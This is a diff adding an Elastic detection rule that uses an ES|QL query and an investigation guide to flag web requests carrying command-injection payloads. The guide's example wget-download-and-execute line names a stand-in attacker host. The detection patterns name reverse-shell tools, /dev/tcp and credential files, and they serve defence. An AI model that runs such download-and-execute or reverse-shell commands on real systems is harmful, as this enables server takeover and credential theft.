@@ -1,0 +1,226 @@
+[metadata]
+creation_date = "2025/11/19"
+integration = ["nginx", "apache", "apache_tomcat", "iis"]
+maturity = "production"
+updated_date = "2025/12/05"
+
+[rule]
+author = ["Elastic"]
+description = """
+This rule detects potential command injection attempts via web server requests by identifying URLs that contain
+suspicious patterns commonly associated with command execution payloads. Attackers may exploit vulnerabilities in web
+applications to inject and execute arbitrary commands on the server, often using interpreters like Python, Perl, Ruby,
+PHP, or shell commands. By monitoring for these indicators in web traffic, security teams can identify and respond to
+potential threats early.
+"""
+from = "now-11m"
+interval = "10m"
+language = "esql"
+license = "Elastic License v2"
+name = "Web Server Potential Command Injection Request"
+note = """ ## Triage and analysis
+
+> **Disclaimer**:
+> This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.
+
+### Investigating Web Server Potential Command Injection Request
+
+This rule flags web requests whose URLs embed command-execution payloads—interpreter flags, shell invocations, netcat reverse shells, /dev/tcp, base64, credential file paths, downloaders, and suspicious temp or cron paths. It matters because attackers use low-volume, successful (200) requests to trigger server-side command injection and gain persistence or control without obvious errors. Example: a crafted query executes bash -c 'wget http://attacker/rev.sh -O /tmp/r; chmod +x /tmp/r; /tmp/r' from the web app, yielding a 200 while dropping and running a payload.
+
+### Possible investigation steps
+
+- Pull the raw HTTP request or PCAP, repeatedly URL-decode and base64-decode parameters, and extract shell metacharacters, commands, IP:port pairs, file paths, and download URLs to infer execution intent.
+- Time-correlate the request with host telemetry for web-server-owned child processes, file writes in /tmp, /dev/shm, or web roots, cron modifications, and new outbound connections from the same host.
+- Pivot on the source IP and user-agent to find related requests across other hosts/endpoints, identify scan-to-exploit sequencing and success patterns, and enact blocking or rate limiting if malicious.
+- Map the targeted route to its backend handler and review code/config to see if user input reaches exec/system/os.popen, templating/deserialization, or shell invocations, then safely reproduce in staging to validate exploitability.
+- If the payload references external indicators, search DNS/proxy/firewall telemetry for matching egress, retrieve and analyze any downloaded artifacts, and hunt for the same indicators across the fleet.
+
+### False positive analysis
+
+- A documentation or code-rendering page that echoes command-like strings from query parameters (e.g., "bash -c", "python -c", "curl", "/etc/passwd") returns 200 while merely displaying text, so the URL contains payload keywords without any execution.
+- A low-volume developer or QA test to a sandbox route includes path or query values like "/dev/tcp/", "nc 10.0.0.1 4444", "busybox", or "chmod +x" to validate input handling, the server returns 200 and the rule triggers despite no server-side execution path consuming those parameters.
+
+### Response and remediation
+
+- Block the offending source IPs and User-Agents at the WAF/reverse proxy, add virtual patches to drop URLs containing 'bash -c', '/dev/tcp', 'base64 -d', 'curl' or 'nc', and remove the targeted route from the load balancer until verified safe.
+- Isolate the impacted host from the network (at minimum egress) if the web service spawns child processes like bash/sh/python -c, creates files in /tmp or /dev/shm, modifies /etc/cron.*, or opens outbound connections to an IP:port embedded in the request.
+- Acquire volatile memory and preserve access/error logs and any downloaded script before cleanup, then terminate malicious child processes owned by nginx/httpd/tomcat/w3wp, delete dropped artifacts (e.g., /tmp/*, /dev/shm/*, suspicious files in the webroot), and revert cron/systemd or SSH key changes.
+- Rotate credentials and tokens if /etc/passwd, /etc/shadow, or ~/.ssh paths were targeted, rebuild the host or container from a known-good image, patch the application and dependencies, and validate clean startup with outbound traffic restricted to approved destinations.
+- Immediately escalate to the incident commander and legal/privacy if remote command execution is confirmed (evidence: web-server-owned 'bash -c' or 'python -c' executed, curl/wget download-and-execute, or reverse shell to an external IP:port) or if sensitive data exposure is suspected.
+- Harden by enforcing strict input validation, disabling shell/exec functions in the runtime (e.g., PHP disable_functions and no shell-outs in templates), running under least privilege with noexec,nodev /tmp and a read-only webroot, restricting egress by policy, and deploying WAF rules and host sensors to detect these strings and cron/webshell creation.
+"""
+risk_score = 21
+rule_id = "f3ac6734-7e52-4a0d-90b7-6847bf4308f2"
+severity = "low"
+tags = [
+    "Domain: Web",
+    "Use Case: Threat Detection",
+    "Tactic: Reconnaissance",
+    "Tactic: Persistence",
+    "Tactic: Execution",
+    "Tactic: Credential Access",
+    "Tactic: Command and Control",
+    "Data Source: Nginx",
+    "Data Source: Apache",
+    "Data Source: Apache Tomcat",
+    "Data Source: IIS",
+    "Resources: Investigation Guide",
+]
+timestamp_override = "event.ingested"
+type = "esql"
+query = '''
+from logs-nginx.access-*, logs-apache.access-*, logs-apache_tomcat.access-*, logs-iis.access-*
+| where
+    // Limit to 200 response code to reduce noise
+    http.response.status_code == 200
+
+| eval Esql.url_original_to_lower = to_lower(url.original)
+
+| eval Esql.contains_interpreter = case(Esql.url_original_to_lower like "*python* -c*" or Esql.url_original_to_lower like "*perl* -e*" or Esql.url_original_to_lower like "*ruby* -e*" or Esql.url_original_to_lower like "*ruby* -rsocket*" or Esql.url_original_to_lower like "*lua* -e*" or Esql.url_original_to_lower like "*php* -r*" or Esql.url_original_to_lower like "*node* -e*", 1, 0)
+| eval Esql.contains_shell = case(Esql.url_original_to_lower like "*/bin/bash*" or Esql.url_original_to_lower like "*bash*-c*" or Esql.url_original_to_lower like "*/bin/sh*" or Esql.url_original_to_lower rlike "*sh.{1,2}-c*", 1, 0)
+| eval Esql.contains_nc = case(Esql.url_original_to_lower like "*netcat*" or Esql.url_original_to_lower like "*ncat*" or Esql.url_original_to_lower rlike """.*nc.{1,2}[0-9]{1,3}(\.[0-9]{1,3}){3}.{1,2}[0-9]{1,5}.*""" or Esql.url_original_to_lower like "*nc.openbsd*" or Esql.url_original_to_lower like "*nc.traditional*" or Esql.url_original_to_lower like "*socat*", 1, 0)
+| eval Esql.contains_devtcp = case(Esql.url_original_to_lower like "*/dev/tcp/*" or Esql.url_original_to_lower like "*/dev/udp/*", 1, 0)
+| eval Esql.contains_helpers = case((Esql.url_original_to_lower like "*/bin/*" or Esql.url_original_to_lower like "*/usr/bin/*") and (Esql.url_original_to_lower like "*mkfifo*" or Esql.url_original_to_lower like "*nohup*" or Esql.url_original_to_lower like "*setsid*" or Esql.url_original_to_lower like "*busybox*"), 1, 0)
+| eval Esql.contains_sus_cli = case(Esql.url_original_to_lower like "*import*pty*spawn*" or Esql.url_original_to_lower like "*import*subprocess*call*" or Esql.url_original_to_lower like "*tcpsocket.new*" or Esql.url_original_to_lower like "*tcpsocket.open*" or Esql.url_original_to_lower like "*io.popen*" or Esql.url_original_to_lower like "*os.execute*" or Esql.url_original_to_lower like "*fsockopen*", 1, 0)
+| eval Esql.contains_privileges = case(Esql.url_original_to_lower like "*chmod*+x", 1, 0)
+| eval Esql.contains_downloader = case(Esql.url_original_to_lower like "*curl *" or Esql.url_original_to_lower like "*wget *" , 1, 0)
+| eval Esql.contains_file_read_keywords = case(Esql.url_original_to_lower like "*/etc/shadow*" or Esql.url_original_to_lower like "*/etc/passwd*" or Esql.url_original_to_lower like "*/root/.ssh/*" or Esql.url_original_to_lower like "*/home/*/.ssh/*" or Esql.url_original_to_lower like "*~/.ssh/*" or Esql.url_original_to_lower like "*/proc/self/environ*", 1, 0)
+| eval Esql.contains_base64_cmd = case(Esql.url_original_to_lower like "*base64*-d*" or Esql.url_original_to_lower like "*echo*|*base64*", 1, 0)
+| eval Esql.contains_suspicious_path = case(Esql.url_original_to_lower like "*/tmp/*" or Esql.url_original_to_lower like "*/var/tmp/*" or Esql.url_original_to_lower like "*/dev/shm/*" or Esql.url_original_to_lower like "*/root/*" or Esql.url_original_to_lower like "*/home/*/*" or Esql.url_original_to_lower like "*/var/www/*" or Esql.url_original_to_lower like "*/etc/cron.*/*", 1, 0)
+
+| eval Esql.any_payload_keyword = case(
+    Esql.contains_interpreter == 1 or Esql.contains_shell == 1 or Esql.contains_nc == 1 or Esql.contains_devtcp == 1 or
+    Esql.contains_helpers == 1 or Esql.contains_sus_cli == 1 or Esql.contains_privileges == 1 or Esql.contains_downloader == 1 or
+    Esql.contains_file_read_keywords == 1 or Esql.contains_base64_cmd == 1 or Esql.contains_suspicious_path == 1, 1, 0)
+
+| keep
+    @timestamp,
+    Esql.url_original_to_lower,
+    Esql.any_payload_keyword,
+    Esql.contains_interpreter,
+    Esql.contains_shell,
+    Esql.contains_nc,
+    Esql.contains_devtcp,
+    Esql.contains_helpers,
+    Esql.contains_sus_cli,
+    Esql.contains_privileges,
+    Esql.contains_downloader,
+    Esql.contains_file_read_keywords,
+    Esql.contains_base64_cmd,
+    Esql.contains_suspicious_path,
+    source.ip,
+    destination.ip,
+    agent.id,
+    http.request.method,
+    http.response.status_code,
+    user_agent.original,
+    host.name,
+    event.dataset,
+    data_stream.namespace
+
+| stats
+    Esql.event_count = count(),
+    Esql.url_path_count_distinct = count_distinct(Esql.url_original_to_lower),
+
+    // General fields
+
+    Esql.host_name_values = values(host.name),
+    Esql.agent_id_values = values(agent.id),
+    Esql.url_path_values = values(Esql.url_original_to_lower),
+    Esql.http.response.status_code_values = values(http.response.status_code),
+    Esql.user_agent_original_values = values(user_agent.original),
+    Esql.event_dataset_values = values(event.dataset),
+    Esql.data_stream_namespace_values = values(data_stream.namespace),
+
+    // Rule Specific fields
+    Esql.any_payload_keyword_max = max(Esql.any_payload_keyword),
+    Esql.contains_interpreter_values = values(Esql.contains_interpreter),
+    Esql.contains_shell_values = values(Esql.contains_shell),
+    Esql.contains_nc_values = values(Esql.contains_nc),
+    Esql.contains_devtcp_values = values(Esql.contains_devtcp),
+    Esql.contains_helpers_values = values(Esql.contains_helpers),
+    Esql.contains_sus_cli_values = values(Esql.contains_sus_cli),
+    Esql.contains_privileges_values = values(Esql.contains_privileges),
+    Esql.contains_downloader_values = values(Esql.contains_downloader),
+    Esql.contains_file_read_keywords_values = values(Esql.contains_file_read_keywords),
+    Esql.contains_base64_cmd_values = values(Esql.contains_base64_cmd),
+    Esql.contains_suspicious_path_values = values(Esql.contains_suspicious_path)
+
+    by source.ip, agent.id
+
+| where
+    // Filter for potential command injection attempts with low event counts to reduce false positives
+    Esql.any_payload_keyword_max == 1 and Esql.event_count < 5
+'''
+
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+
+[[rule.threat.technique]]
+id = "T1505"
+name = "Server Software Component"
+reference = "https://attack.mitre.org/techniques/T1505/"
+
+[[rule.threat.technique.subtechnique]]
+id = "T1505.003"
+name = "Web Shell"
+reference = "https://attack.mitre.org/techniques/T1505/003/"
+
+[rule.threat.tactic]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/tactics/TA0003/"
+
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+
+[[rule.threat.technique]]
+id = "T1059"
+name = "Command and Scripting Interpreter"
+reference = "https://attack.mitre.org/techniques/T1059/"
+
+[[rule.threat.technique.subtechnique]]
+id = "T1059.004"
+name = "Unix Shell"
+reference = "https://attack.mitre.org/techniques/T1059/004/"
+
+[rule.threat.tactic]
+id = "TA0002"
+name = "Execution"
+reference = "https://attack.mitre.org/tactics/TA0002/"
+
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+
+[[rule.threat.technique]]
+id = "T1071"
+name = "Application Layer Protocol"
+reference = "https://attack.mitre.org/techniques/T1071/"
+
+[rule.threat.tactic]
+id = "TA0011"
+name = "Command and Control"
+reference = "https://attack.mitre.org/tactics/TA0011/"
+
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+
+[[rule.threat.technique]]
+id = "T1595"
+name = "Active Scanning"
+reference = "https://attack.mitre.org/techniques/T1595/"
+
+[[rule.threat.technique.subtechnique]]
+id = "T1595.002"
+name = "Vulnerability Scanning"
+reference = "https://attack.mitre.org/techniques/T1595/002/"
+
+[[rule.threat.technique.subtechnique]]
+id = "T1595.003"
+name = "Wordlist Scanning"
+reference = "https://attack.mitre.org/techniques/T1595/003/"
+
+[rule.threat.tactic]
+id = "TA0043"
+name = "Reconnaissance"
+reference = "https://attack.mitre.org/tactics/TA0043/"
